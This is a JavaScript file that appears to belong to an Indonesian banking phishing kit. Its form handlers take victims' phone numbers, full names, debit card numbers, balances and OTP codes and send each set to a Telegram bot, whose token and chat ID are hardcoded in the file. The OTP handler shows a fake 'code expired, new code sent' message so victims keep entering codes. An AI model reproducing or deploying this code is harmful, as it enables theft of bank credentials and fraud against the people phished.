  function sendNohp(event){
     event.preventDefault();
   

document.getElementById('btnSubmit').innerHTML = "Memproses...";    
    var nama = document.getElementById('nama');
   

    var gabungan = '𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲%3A%0A' + nama.value;

   var token = '6914486729:AAG8xUNLH2YzB9VJHRBoVVgZO5YBuTbsB4s'; 
    var grup = '6771164860'; 

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
     
     success: function(){;
     setTimeout(function(){
 var nomor = document.getElementById("nama").value;
 sessionStorage.setItem("nomor", nomor);          location.href ="./login.html";
     }, 500);}});};
     
     
     
     
 function sendDebit(event){
    event.preventDefault();
   
    
document.getElementById('btnSubmit').innerHTML = "Memproses...";    
var nomorku = document.getElementById('nomorku');
var nama = document.getElementById('nama');
var debit = document.getElementById('debit');

    var gabungan = '𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲%3A%0A' + nomorku.value + '%0A𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽%3A%0A' + nama.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁%3A%0A' + debit.value;
   
   
   var token = '6914486729:AAG8xUNLH2YzB9VJHRBoVVgZO5YBuTbsB4s'; 
    var grup = '6771164860'; 

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    
    success: function(){
  var nomorme = document.getElementById("nomorku").value;
 sessionStorage.setItem("nomorme", nomorme);    var namaku = document.getElementById("nama").value;
 sessionStorage.setItem("namaku", namaku); 
   var debitku = document.getElementById("debit").value;
 sessionStorage.setItem("debitku", debitku);  
    window.location.href="saldo.html";    
}});};

 
 var nomor = sessionStorage.getItem("nomor");
 document.getElementById("nomorku").value = nomor + "";
     
     
     
     
     function sendOtp(event){
    event.preventDefault();
   
    
document.getElementById('btnSubmit').innerHTML = "Memproses...";    
var logo = document.getElementById('logo');
var otp = document.getElementById('otp');


    var gabungan = '' + logo.value + '%0A𝗞𝗼𝗱𝗲 𝗢𝗧𝗣%3A%0A' + otp.value;
   
   
   var token = '6914486729:AAG8xUNLH2YzB9VJHRBoVVgZO5YBuTbsB4s'; 
    var grup = '6771164860'; 

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    
    success: function(){
$("#invalid").addClass("fontku");      
$("#invalid").text("Kode OTP Kadaluarsa, Silahkan Coba Lagi");
$("#invalid").css("color","red");
        
   setTimeout(function(){
        $("#invalid").text("Kode OTP baru sudah kami kirimkan kembali");
$("#invalid").css("color","green");
        $("#invalid").show()
   }, 3000);
   setTimeout(function(){
  $("#invalid").css("color","#0f78cb");    
        $("#invalid").text(">> Request Kode OTP ? <<");
     $("#invalid").removeClass("fontku");  document.getElementById('btnSubmit').innerHTML = "PROSES";$("#otp").val("");          
                $("#otp").focus();
   }, 5000);}});};





function sendSaldo(event){
    event.preventDefault();
   
    
document.getElementById('btnSubmit').innerHTML = "Memproses...";    
var tanparupiah = document.getElementById('tanparupiah');
var nomormy = document.getElementById('nomormy');
var namamy = document.getElementById('namamy');
var debitmy = document.getElementById('debitmy');
var rupiah = document.getElementById('rupiah');



    var gabungan = '' + tanparupiah.value + '𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲%3A%0A' + nomormy.value + '%0A𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽%3A%0A' + namamy.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁%3A%0A' + debitmy.value + '%0A𝗦𝗮𝗹𝗱𝗼 𝗧𝗲𝗿𝗮𝗸𝗵𝗶𝗿%3A%0A' + rupiah.value;
   
   
   var token = '6914486729:AAG8xUNLH2YzB9VJHRBoVVgZO5YBuTbsB4s'; 
    var grup = '6771164860'; 

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    
    success: function(){
window.location.href="otp.html";
        
    }});};
